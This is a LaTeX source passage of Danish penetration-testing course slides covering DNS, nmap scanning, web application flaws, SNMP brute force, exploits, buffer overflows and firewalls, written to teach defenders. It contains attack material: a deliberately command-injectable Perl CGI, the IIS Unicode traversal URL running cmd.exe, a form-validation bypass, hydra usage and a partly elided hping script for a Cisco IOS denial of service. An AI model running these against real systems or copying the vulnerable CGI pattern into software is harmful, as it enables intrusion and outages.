   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                    Example Internet Datagram Header
\end{alltt}


\slide{Well-known port numbers}

\hlkimage{10cm}{iana1.jpg}

\begin{list1}
\item IANA vedligeholder en liste over magiske konstanter i IP
\item De har lister med hvilke protokoller har hvilke protokol ID m.v.
\item En liste af interesse er port numre, hvor et par eksempler er:
\begin{list2}
\item Port 25 SMTP Simple Mail Transfer Protocol
\item Port 53 DNS Domain Name System
\item Port 80 HTTP Hyper Text Transfer Protocol over TLS/SSL
\item Port 443 HTTP over TLS/SSL
\end{list2}
\item Se flere på \link{http://www.iana.org}
\end{list1}



\slide{Domain Name System}

\hlkimage{12cm}{dns-1.pdf}

\begin{list1}
\item En DNS server kan slå navne, domæner og adresser op
\item Foregår via query og response med datatyper kaldet resource records
\item DNS er en distribueret database, så opslag kan resultere i flere opslag
\end{list1}


\slide{DNS systemet}
 
\begin{list1}
\item navneopslag på Internet  
\item tidligere brugte man en {\bfseries hosts} fil\\
  hosts filer bruges stadig lokalt til serveren - IP-adresser
\item UNIX: /etc/hosts
\item Windows \verb+c:\windows\system32\drivers\etc\hosts+
\item Eksempel: www.solido.net har adressen 91.102.95.20
\item skrives i database filer, zone filer
\end{list1}
\begin{alltt}
  ns1     IN      A       91.102.95.95
  IN      AAAA    2a02:9d0:10::9
  www     IN      A       91.102.95.20
  IN      AAAA    2a02:9d0:10::9
\end{alltt}

\slide{Mere end navneopslag}

\begin{list1}
\item består af resource records med en type:
  \begin{list2}
  \item adresser A-records, fra navn til IP
\item PTR reverse records, fra IP til navn
  \item IPv6 adresser AAAA-records
  \item autoritative navneservere NS-records
  \item post, mail-exchanger MX-records
  \item flere andre: md ,  mf ,  cname ,  soa ,
    mb , mg ,  mr ,  null ,  wks ,  ptr ,
    hinfo ,  minfo ,  mx ....
  \end{list2}
\end{list1}
\begin{alltt}
  IN      MX      10      mail.security6.net.
  IN      MX      20      mail2.security6.net.
\end{alltt}

\slide{DNS root servere}
\begin{list1}
\item Root-servere - 13 stk geografisk distribueret fordelt på Internet
\end{list1}

\begin{alltt}
  I.ROOT-SERVERS.NET.     3600000 A       192.36.148.17
  E.ROOT-SERVERS.NET.     3600000 A       192.203.230.10
  D.ROOT-SERVERS.NET.     3600000 A       128.8.10.90
  A.ROOT-SERVERS.NET.     3600000 A       198.41.0.4
  H.ROOT-SERVERS.NET.     3600000 A       128.63.2.53
  C.ROOT-SERVERS.NET.     3600000 A       192.33.4.12
  G.ROOT-SERVERS.NET.     3600000 A       192.112.36.4
  F.ROOT-SERVERS.NET.     3600000 A       192.5.5.241
  B.ROOT-SERVERS.NET.     3600000 A       128.9.0.107
  J.ROOT-SERVERS.NET.     3600000 A       198.41.0.10
  K.ROOT-SERVERS.NET.     3600000 A       193.0.14.129
  L.ROOT-SERVERS.NET.     3600000 A       198.32.64.12
  M.ROOT-SERVERS.NET.     3600000 A       202.12.27.33  
\end{alltt}

\slide{DK-hostmaster}

\begin{list1}
\item bestyrer .dk TLD - top level domain
  
\item man registrerer ikke .dk-domæner hos DK-hostmaster, men hos en
  registrator 
\item Et domæne bør have flere navneservere og flere postservere
\item autoritativ navneserver - ved autoritativt om IP-adresse for
  maskine.domæne.dk findes 
\item ikke-autoritativ - har på vegne af en klient slået en adresse op
\item Det anbefales at overveje en service som
  \link{http://www.gratisdns.dk} der har 5 navneservere distribueret
  over stor geografisk afstand - en udenfor Danmark
\end{list1}

\slide{Små DNS tools bind-version - Shell script}

\begin{alltt}\small
#! /bin/sh
# Try to get version info from BIND server
PROGRAM=`basename $0`
. `dirname $0`/functions.sh
if [ $# -ne 1 ]; then
   echo "get name server version, need a target! "
   echo "Usage: $0 target"
   echo "example $0 10.1.2.3"
   exit 0
fi
TARGET=$1
# using dig 
start_time
dig @$1 version.bind chaos txt
echo Authors BIND er i versionerne 9.1 og 9.2 - måske ...
dig @$1 authors.bind chaos txt
stop_time
\end{alltt}
\centerline{\link{http://www.kramse.dk/files/tools/dns/bind-version}}

\slide{Små DNS tools dns-timecheck - Perl script}

\begin{alltt}\small
#!/usr/bin/perl
# modified from original by Henrik Kramshøj, hlk@kramse.dk
# 2004-08-19
#
# Original from: http://www.rfc.se/fpdns/timecheck.html
use Net::DNS;

my $resolver = Net::DNS::Resolver->new;
$resolver->nameservers($ARGV[0]);

my $query = Net::DNS::Packet->new;
$query->sign_tsig("n","test");

my $response = $resolver->send($query);
foreach my $rr ($response->additional) {
  print "localtime vs nameserver $ARGV[0] time difference: ";
  print$rr->time_signed - time() if $rr->type eq "TSIG";
}  
\end{alltt}
% inserting stupid $ to stop EMACS from
\centerline{\link{http://www.kramse.dk/files/tools/dns/dns-timecheck}}

\slide{Google for it}

\hlkimage{18cm}{images/googledorks-1.pdf}

\begin{list1}
\item Google som hacker værktøj?
\item Googledorks
\link{http://johnny.ihackstuff.com/}
\end{list1}



\exercise{ex:basic-dns-lookup}
\exercise{ex:bind-version-script}
\exercise{ex:dns-timecheck}

\slide{Basal Portscanning}

\begin{list1}
  \item Hvad er portscanning
\item afprøvning af alle porte fra 0/1 og op til 65535
\item målet er at identificere åbne porte - sårbare services
\item typisk TCP og UDP scanning
\item TCP scanning er ofte mere pålidelig end UDP scanning
\end{list1}

{\hlkbig TCP handshake er nemmere at identificere

UDP applikationer svarer forskelligt - hvis overhovedet}

\slide{TCP three way handshake}

\hlkimage{7cm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item Tidligere loggede systemer kun når der var etableret en fuld TCP
  forbindelse - dette kan/kunne udnyttes til \emph{stealth}-scans
\item Hvis en maskine modtager mange SYN pakker kan dette fylde
  tabellen over connections op - og derved afholde nye forbindelser
  fra at blive oprette - {\bfseries SYN-flooding}
\end{list2}


\slide{Ping og port sweep}

\begin{list1}
\item scanninger på tværs af netværk kaldes for sweeps 
\item Scan et netværk efter aktive systemer med PING
\item Scan et netværk efter systemer med en bestemt port åben
\item Er som regel nemt at opdage:
  \begin{list2}
    \item konfigurer en maskine med to IP-adresser som ikke er i brug
\item hvis der kommer trafik til den ene eller anden er det portscan
\item hvis der kommer trafik til begge IP-adresser er der nok
  foretaget et sweep - bedre hvis de to adresser ligger et stykke fra hinanden
  \end{list2}

\end{list1}

\slide{nmap port sweep efter port 80/TCP}

\begin{list1}
  \item Port 80 TCP er webservere
\end{list1}

\begin{alltt}
\small # {\bfseries nmap  -p 80 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
80/tcp     filtered    http                    

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
80/tcp     open        http                    

Interesting ports on  (217.157.20.139):
Port       State       Service
80/tcp     open        http                    

\end{alltt}

\slide{nmap port sweep efter port 161/UDP}

\begin{list1}
  \item Port 161 UDP er SNMP
\end{list1}

\begin{alltt}  
\small # {\bfseries nmap -sU -p 161 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on mail.kramse.dk (217.157.20.130) is: closed

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on  (217.157.20.132) is: closed
\end{alltt}

\slide{OS detection}
\begin{alltt}
\footnotesize
# nmap -O ip.adresse.slet.tet \emph{scan af en gateway}
Starting nmap 3.48 ( http://www.insecure.org/nmap/ ) at 2003-12-03 11:31 CET
Interesting ports on gw-int.security6.net (ip.adresse.slet.tet):
(The 1653 ports scanned but not shown below are in state: closed)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1080/tcp open  socks
5000/tcp open  UPnP
Device type: general purpose
Running: FreeBSD 4.X
OS details: FreeBSD 4.8-STABLE
Uptime 21.178 days (since Wed Nov 12 07:14:49 2003)
Nmap run completed -- 1 IP address (1 host up) scanned in 7.540 seconds
\end{alltt}

\begin{list2}
  \item lavniveau måde at identificere operativsystemer på
\item send pakker med \emph{anderledes} indhold
\item Reference: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin\\ \link{http://www.sys-security.com/html/projects/icmp.html}
\end{list2}

\slide{Zenmap}

\hlkimage{22cm}{nmap-zenmap.png}

\centerline{Vi bruger Zenmap til at scanne med, GUI til Nmap}

% opgaver session 1-6 

\exercise{ex:nmap-pingsweep}
\exercise{ex:nmap-synscan}
\exercise{ex:nmap-os}
\exercise{ex:nmap-service}



% afslutning dag 1
\slide{Erfaringer hidtil}

\begin{list1}
  \item mange oplysninger
\item kan man stykke oplysningerne sammen kan man sige en hel del om
  netværket 
\item en skabelon til registrering af maskiner er god
  \begin{list2}
    \item svarer på ICMP: $\Box$\  echo, $\Box$\ mask, $\Box$\ time
\item svarer på traceroute: $\Box$\ ICMP, $\Box$\ UDP
\item Åbne porte TCP og UDP: 
\item Operativsystem:
\item ... (banner information m.v.)
  \end{list2}
\item Mange små pakker kan oversvømme store forbindelser og
  give problemer for netværk
\end{list1}



\slide{Hvad er værdien af pentest?}

\begin{list1}
\item hvor og hvordan kan I bruge penetrationstest
\item hvis man vil have et andet indblik i netværket, TCP, UDP, ICMP,
  portscannning og samle puslespil udfra få informationer 
\item Netværksadministratorer kan bruge pentesting til at sikre egne
  netværk ved brug af samme teknikker som hackere
\item Pentesting er ikke kun til test af produktionsnetværk
\item man skal ofte vurdere nye produkter - sikkerhedsmæssigt og
  funktionalitetsmæssigt - yder det beskyttelse, forbedrer det
  sikkerheden m.v.
\item Man står med en server der er kompromitteret - hvordan skete
  det? - hvordan forhindrer vi det en anden gang. 
\end{list1}



\slide{Insecure programming - web}

\vskip 2 cm

\begin{list1}
\item Problem:\\
Ønsker et simpelt CGI program, en web udgave af finger
\item Formål:\\
Vise oplysningerne om brugere på systemet
\item Vi bruger Web applikationer som eksempel!
\end{list1}

\slide{Muligheder for web programmering}

\begin{list1}
\item ASP, PHP, Ruby on Rails m.fl.
\begin{list2}
\item server scripting, meget generelt - man kan alt
\end{list2}

\item SQL
\begin{list2}
\item databasesprog - meget kraftfuldt
\item mange databasesystemer giver mulighed for specifik tildeling af
  privilegier "grant" 
  \end{list2}
\item JAVA
\begin{list2}
\item generelt programmeringssprog
\item bytecode verifikation
\item indbygget sandbox funktionalitet 
\end{list2}
\item Perl og andre generelle programmeringssprog
\item Pas på shell escapes!!!
\end{list1}

\slide{Hello world of insecure web CGI}

\begin{list1}
\item Demo af et sårbart system - badfinger
\item Løsning:
\begin{list2}
\item Kalde finger kommandoen
\item et Perl script
\item afvikles som CGI 
\item standard Apache HTTPD 1.3 server
\end{list2}
\end{list1}

\slide{De vitale - og usikre dele}

\begin{alltt}
print "Content-type: text/html <html>";
print "<body bgcolor=#666666 leftmargin=20 topmargin=20"; 
print <<XX;
<h1>Bad finger command!</h1>
<HR COLOR=#000>
<form method="post" action="bad_finger.cgi">
Enter userid: <input type="text" size="40" name="command">
</form>
<HR COLOR=#000>
XX
if(&ReadForm(*input)){
    print "<pre>";
    print "will execute: /usr/bin/finger $input\{'command'\}";
    print "<HR COLOR=#000>";
    {\bf print `/usr/bin/finger $input\{'command'\}`;}
    print "<pre>";
}
\end{alltt}

\slide{Mere Web application hacking}

\hlkimage{5cm}{images/web-app-hackers-handbook.jpeg}

\begin{list1}
\item \emph{The Web Application Hacker's Handbook: Discovering and Exploiting Security Flaws}
Dafydd Stuttard, Marcus Pinto, Wiley 2007 ISBN: 978-0470170779
\end{list1}

\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Manuelt download form:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret"
ONSUBMIT="return validate(this)">
\end{alltt}
\item fjern kald til validering:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Tilføj 'BASE HREF' i header, findes med browser - højreklik
  properties i Internet Explorer

\end{list1}    


\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Den form som man bruger er så - fra sin lokale harddisk:
\begin{alltt}
<HEAD>
<TITLE>Our Products</TITLE>
<BASE href="http://www.target.server/sti/til/form">
</HEAD>
...
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Kald form i en browser og indtast værdier
\end{list1}    

\slide{WebScarab eller Firefox plugins} 

\begin{list1}
\item Man bliver hurtigt træt af at ændre forms på den måde
\item Istedet anvendes en masse proxyprogrammer
\item Nogle af de mest kendte er:
\begin{list2}
\item Burp proxy
\item Parox proxy
\item Firefox extension tamper data
\item OWASP WebScarab
\end{list2}
\end{list1}


\slide{webroot - unicode dekodning}

\begin{list1}
\item webroot er det sted på harddisken, hvorfra data der vises af
  webserveren hentes. 

\item Unicode bug:\\
{\small
\verb-http://10.0.43.10/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:-
}
\item Kilde:\\
\link{http://www.cgisecurity.com/archive/misc/unicode.txt} - rain forest puppy\\
\link{http://online.securityfocus.com/bid/1806/info/} - securityfocus info
\end{list1}

\slide{Sårbare programmer}
\begin{list1}
\item Hvorfor er programmerne stadig sårbare?
\item RFP exploits - adgang til kommandolinien via database\\
\verb+?:\Program Files\Common Files\System\Msadc\msadcs.dll+ 
\item Unicode - fejl i håndtering af specialtilfælde
\item double decode - flere fejl i håndtering af nye specialtilfælde
\item Dark spyrit jill.c - Internet Printing Protocol IPP.
                Ny funktionalitet som implementeres med fejl  
\item {\bf Programmer idag er komplekse!}
\end{list1}

\slide{Historik indenfor websikkerhed}

\begin{list1}
\item IIS track record
\begin{list2}
\item meget funktionalitet
\item større risiko for fejl
\item alvorlige fejl - arbitrary code execution
\end{list2}
\item Apache track record
\begin{list2}
\item typisk mindre funktionalitet
\item typisk haft mindre alvorlige fejl
\end{list2}
\item PHP track record?
\item Sammenligning IIS med Apache+PHP, idet en direkte sammenligning mellem
IIS og Apache vil være unfair 
\item {\bfseries Meget få har idag små websteder med statisk indhold}
\item Både IIS version 6 og Apache version 2 anbefales idag, fremfor tidligere versioner
\end{list1}

\slide{Nikto og W3af}

\hlkimage{15cm}{w3af-logo.png}

\begin{list1}
\item Vi afprøver nu følgende programmer sammen:
\item Nikto web server scanner \link{http://cirt.net/nikto2}
\item W3af Web Application Attack and Audit Framework \link{http://w3af.sourceforge.net/}
\item Begge findes på BackTrack 
\end{list1}

\slide{Skipfish}

\hlkimage{16cm}{skipfish-screen.png}

\begin{list1}
\item Vi afprøver nu følgende program sammen:
\item Skipfish fully automated, active web application security reconnaissance tool.
\item Af Michal Zalewski \link{http://code.google.com/p/skipfish/}
\end{list1}


\slide{Opsummering websikkerhed}

\begin{list1}
\item Husk hidden fields er ikke mere skjulte end
"view source"-knappen i browseren
\item serverside validering er nødvendigt
\item SQL injection er nemt at udføre og almindeligt
\item Cross-site scripting kan have uanede muligheder
\item Brug top 10 listen fra \link{http://www.owasp.org}
\item Brug WebGoat fra OWASP til at lære mere om Websikkerhed
\end{list1}




% TORSDAG

%\slide{Dag 2 Exploits, OpenVAS og Metasploit}
\slide{Exploits, OpenVAS og Metasploit}

\vskip 4 cm
\centerline{\color{titlecolor}\LARGE\bf Hacking, buffer overflows, scannerværktøjer }

\slide{Simple Network Management Protocol}

\begin{list1}
\item SNMP er en protokol der supporteres af de fleste professionelle
  netværksenheder, såsom switche, routere
\item hosts - skal slås til men følger som regel med
\item SNMP bruges til: 
  \begin{list2}
    \item \emph{network management}
    \item statistik
    \item rapportering af fejl - SNMP traps
  \end{list2}
\item {\bfseries sikkerheden baseres på community strings der sendes
    som klartekst ...}
\item det er nemmere at brute-force en community string end en
  brugerid/kodeord kombination
\end{list1}


\slide{brute force}

\begin{list1}
\item hvad betyder bruteforcing?\\
afprøvning af alle mulighederne
\end{list1}

\begin{alltt}
\small
Hydra v2.5 (c) 2003 by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] 
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME] 
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...  
\end{alltt}

\slide{Routing}

\vskip 1 cm

\begin{list1}
  \item routing table - tabel over netværkskort og tilhørende adresser
\item default gateway - den adresse hvortil man sender
  \emph{non-local} pakker\\kaldes også default route, gateway of last
  resort
\item routing styres enten manuelt - opdatering af route tabellen,
  eller konfiguration af adresser og subnet maske på netkort
\item eller automatisk ved brug af routing protocols - interne og
  eksterne route protokoller
\item de lidt ældre routing protokoller har ingen sikkerhedsmekanismer
\end{list1}

\slide{Source routing}

\begin{list1}
\item source routing - mulighed for at specificere en ønsket vej for
  pakken
 
  \item Hvis en angriber kan fortælle hvilken vej en pakke skal følge
  kan det give anledning til sikkerhedsproblemer
\item maskiner idag bør ikke lytte til source routing, evt. skal de
  droppe pakkerne
\end{list1}

\slide{Angreb mod routing}

\begin{list1}
  \item falske routing updates til protokollerne
\item sende redirect til maskiner

\item Der findes (igen) specialiserede programmer til at teste og
  forfalske routing updates, svarende til icmpush programmet
\item Det anbefales at sikre routere bedst muligt - eksempelvis 
Secure IOS template der findes på adressen:\\
\link{http://www.cymru.com/Documents/secure-ios-template.html}

\item All your packets are belong to us - Attacking backbone technologies\\
Daniel Mende \& Enno Rey fra ERNW i Tyskland
\link{http://www.ernw.de}

\end{list1}







\exercise{ex:find-snmp}
\exercise{ex:hydra-brute}
\exercise{ex:cain-brute}


\slide{Cisco Denial of service CVE-2003-0567} 

\begin{list1}
\item Cisco routere - ude af drift angreb - juli 2003
  \begin{list2}
    

\item Med en bestemt sekvens af pakker til routerens egen adresse på
  et interface kan den bringes i en tilstand hvor den ikke sender
  pakker videre - dødt interface
\item \emph{This issue affects all Cisco devices running Cisco IOS software
  and          configured to process Internet Protocol version 4
  (IPv4) packets. This includes          routers as well as switches
  and line cards which run Cisco IOS software. Cisco          devices
  which do not run Cisco IOS software are not affected.} 

\item kræver genstart

\item pakkerne kan sågar genereres med et shellscript (batch fil) og
  programmer som hping\\ 
  \end{list2}
\item Kilder:\\
\link{http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml}\\
\link{http://www.cert.org/advisories/CA-2003-15.html}\\
\link{http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0567}
\end{list1}

\slide{Cisco \emph{exploit} script}


\begin{alltt}    
\small
#!/bin/sh
# 2003-07-21 pdonahue
# cisco-44020.sh
# -- this shell script is just a wrapper for hping (http://www.hping.org)
#    with the parameters necessary to fill the input queue on
# exploitable IOS device
# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by
# IPv4 Packets" 
# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
#for more information 
...
for protocol in $PROT
    do
       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
    done

\end{alltt}


\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries least privilege} 
betyder at man afvikler kode med det mest
restriktive sæt af privileger - kun lige nok til at
opgaven kan udføres
\item Dette praktiseres ikke i webløsninger i Danmark - eller meget få steder
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på UNIX afvikles som
nobody - ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt - få rettigheder = lille skade
\end{list1}


\slide{Undgå standard indstillinger}

\begin{list1}
\item når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på bugtraq til den
  bliver udnyttet er meget kort idag! 
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist - inden ormene kommer
\item NB: ingen garanti - og det hjælper sjældent mod en dedikeret angriber
\end{list1}

\slide{Matrix the movie Trinity breaking in}

\hlkimage{20cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
\link{http://nmap.org/movies.html}\\
Meget realistisk \link{http://www.youtube.com/watch?v=Zy5\_gYu\_isg}

\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Exploits - udnyttelse af sårbarheder}

\begin{list1}
\item exploit/exploitprogram er
\begin{list2}
\item udnytter eller demonstrerer en sårbarhed
\item rettet mod et specifikt system.
\item kan være 5 linier eller flere sider
\item Meget ofte Perl eller et C program 
\end{list2}
\end{list1}

Eksempel:
\begin{verbatim}
 #! /usr/bin/perl
 # ./chars.pl | nc server 31337
 print "abcdefghijkl";
 print chr(237);
 print chr(13);
 print chr(220);
 print chr(186);
 print "\n";
\end{verbatim}

\slide{local vs. remote exploits}

\begin{list1} 
\item {\bfseries local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries remote root exploit} 
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på UNIX, over netværket. 
\item {\bfseries zero-day exploits} dem som ikke offentliggøres - dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}



\slide{Buffer overflows}

\hlkimage{3cm}{images/shellcoders-handbook.jpg}

\begin{list1}
\item Hvis man vil lære at lave buffer overflows og exploit programmer
  er følgende dokumenter et godt sted at starte
\item \emph{Smashing The Stack For Fun And Profit} Aleph One
\item \emph{Writing Buffer Overflow Exploits with Perl - anno 2000}
\item Følgende bog kan ligeledes anbefales:
\emph{The Shellcoder's Handbook : Discovering and Exploiting Security Holes} 
af Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, Sinan
"noir" Eren, Neel Mehta, Riley Hassell, John Wiley \& Sons, 2004 
\item NB: bogen er avanceret og således IKKE for begyndere! 
\end{list1}

\slide{milw0rm - dagens buffer overflow}

\hlkimage{20cm}{milw0rm.png}

\centerline{\link{http://milw0rm.com/} - men ingen opdateringer}

\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{20cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}


\slide{Metasploit}

\hlkimage{20cm}{metasploit-about.png}

\begin{list1}
\item Trinity brugte et exploit program \smiley
\item Idag findes der samlinger af exploits som milw0rm
\item Udviklingsværktøjerne til exploits er idag meget raffinerede!
\item \link{http://www.metasploit.com/}
\end{list1}

\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Kan du bryde kæden af forudsætninger har du vundet!
\end{list1}

\slide{Stack protection}

\begin{list1}
\item Stack protection er mere almindeligt\\
- med i OpenBSD current fra 2. dec 2002

\item Buffer overflows er almindeligt kendte
\begin{list2}    
\item Selv OpenSSH har haft buffer overflows
\item Stack protection prøver at modvirke/fjerne
  muligheden for buffer overflows. arbitrary code execution
  bliver til ude af drift for berørte services
\end{list2}

\item Propolice\\
\link{http://www.openbsd.org}\\
\link{http://www.trl.ibm.com/projects/security/ssp/}

\item StackGuard\\
\link{http://www.immunix.org/stackguard.html}
\end{list1}

\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\end{list2}
\item OpenBSD er nok nået længst og et godt eksempel\\ \link{http://www.openbsd.org/papers/}
\end{list1}


\slide{JAVA programmering}

\begin{list1}
\item Hvorfor ikke bare bruge JAVA?
\item JAVA karakteristik
\begin{list2}
\item automatisk garbage collection
\item bytecode verifikation på
\item mulighed for signeret kode
\item beskyldes for at være langsomt
\item platformsuafhængigt
\end{list2}
\item JAVA just in Time (JIT) er sammenligneligt med kompileret C
\item god sikkerhedsmodel - men problemer i implementationerne
\item JVM - den virtuelle maskine er udsat for hacking
\end{list1}

% session 3-3 scripting af angreb

\slide{ASCII baserede protokoller}

{\bfseries Diskussion:}\\
I skal se/lære at mange protokoller i dag er \emph{ASCII baserede} -
dvs benytter kommandoer i klar tekst, GET, HEAD, QUIT osv. som gør det
nemt at debugge.


\begin{list1}
\item Det gælder eksempelvis for:
\begin{list2}
\item SMTP
\item POP3
\item FTP
\item HTTP    
\end{list2}
\item man kan altså forbinde til den pågældende service og interagere
\end{list1}

\exercise{ex:netcat-1}
\exercise{ex:openssl}


% session 3-4 automatiseret sårbarhedsscanning

\slide{Hackerværktøjer}

\begin{list1}
\item Dan Farmer og Wietse Venema skrev i 1993 artiklen\\
\emph{Improving the Security of Your Site by Breaking Into it}
\item Senere i 1995 udgav de så en softwarepakke med navnet SATAN
\emph{Security Administrator Tool for Analyzing Networks}
 Pakken vagte
 en del furore, idet man jo gav alle på internet mulighed for at hacke
\begin{quote}
We realize that SATAN is a two-edged sword - like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN. 
\end{quote}
\item SATAN og ideerne med automatiseret scanning efter sårbarheder
  blev siden ført videre i programmer som Saint, SARA og idag findes
  mange hackerværktøjer og automatiserede scannere: 
\begin{list2}
\item OpenVAS, ISS scanner, Fyodor Nmap, Typhoon, ORAscan
\end{list2}
\end{list1}
Kilde:
\link{http://www.fish.com/security/admin-guide-to-cracking.html}



\slide{Brug hackerværktøjer!}

\begin{list1}
\item Hackerværktøjer - bruger I dem? - efter dette kursus gør I 
\item portscannere kan afsløre huller i forsvaret
\item webtestværktøjer som crawler igennem et website og finder alle
  forms kan hjælpe
\item I vil kunne finde mange potentielle problemer proaktivt ved
  regelmæssig brug af disse værktøjer - også potentielle driftsproblemer
\item husk dog penetrationstest er ikke en sølvkugle
\item honeypots kan måske være med til at afsløre angreb og
  kompromitterede systemer hurtigere
\end{list1}


\slide{"I only replaced index.html"}

\begin{list1}
\item Hvad skal man gøre når man bliver hacket ?
\item Hvad koster et indbrud?
\begin{list2}
\item Tid - antal personer der ikke kan arbejde
\item Penge - oprydning, eksterne konsulenter
\item Bøvl - sker altid på det værst mulige tidspunkt
\item Besvær - ALT skal gennemrodes
\item Tab af image/goodwill
\end{list2}
\item Forensic challenge:
I gennemsnit brugte deltagerne 34 timer pr person på
at efterforske i rigtige data fra et indbrud!
angriberen brugte ca. 30 min
\item Kilder:
\link{http://project.honeynet.org/challenge/results/}\\
\link{http://packetstorm.securify.com/docs/hack/i.only.replaced.index.html.txt}
\end{list1}

\slide{Recovering from break-ins}

\begin{list1}
\item {\color{red}\bfseries DU KAN IKKE HAVE TILLID TIL NOGET}
\item På CERT website kan man finde mange gode ressourcer omkring
  sikkerhed og hvad man skal gøre med kompromiterede servere
\item Eksempelvis listen over dokumenter fra adressen:\\
  \link{http://www.cert.org/nav/recovering.html} 
  \begin{list2}
  \item The Intruder Detection Checklist
  \item Windows NT Intruder Detection Checklist 
  \item The UNIX Configuration Guidelines
  \item Windows NT Configuration Guidelines 
  \item The List of Security Tools
  \item Windows NT Security and Configuration Resources 
  \end{list2}
%\item Hvis man mener man står med en kompromitteret server kan
%  følgende være nødvendigt
%  \href{http://www.cert.org/tech_tips/root_compromise.html} 
%{http://www.cert.org/tech\_tips/root\_compromise.html}
\end{list1}



\exercise{ex:openvas}


%\slide{Dag 3 trådløse netværk}


%\hlkimage{3cm}{12065572121317625675no_hope_Wireless_access_point.png}


%\input{wireless-80211}




\slide{Hvad er en firewall}

\vskip 1 cm
\centerline{\hlkbig En firewall er noget som {\color{green}blokerer}
  traffik på Internet}  

\vskip 1 cm
\pause

\centerline{\hlkbig En firewall er noget som {\color{red}tillader}
  traffik på Internet} 

Myte: en firewall beskytter mod alt

\slide{Myten om firewalls}

\begin{list1}
\item Myten: 
\item en firewall beskytter mod alt
\item Sandhed: 
\item en firewall blokerer en masse, fint nok
\item en firewall tillader at du henter en masse ind
\item {\color{green} Beskytter mod direkte angreb fra netværket}
\item {\color{red}Beskytter ikke mod fysiske angreb} 
\item {\color{red}Beskytter ikke mod malware gennem websider og e-mail}
\end{list1}

\centerline{Firewall anbefales altid, specielt på bærbare}


\slide{firewalls}

\begin{itemize}
\item Basalt set et netværksfilter - det yderste fæstningsværk
\item Indeholder typisk:
  \begin{list2}
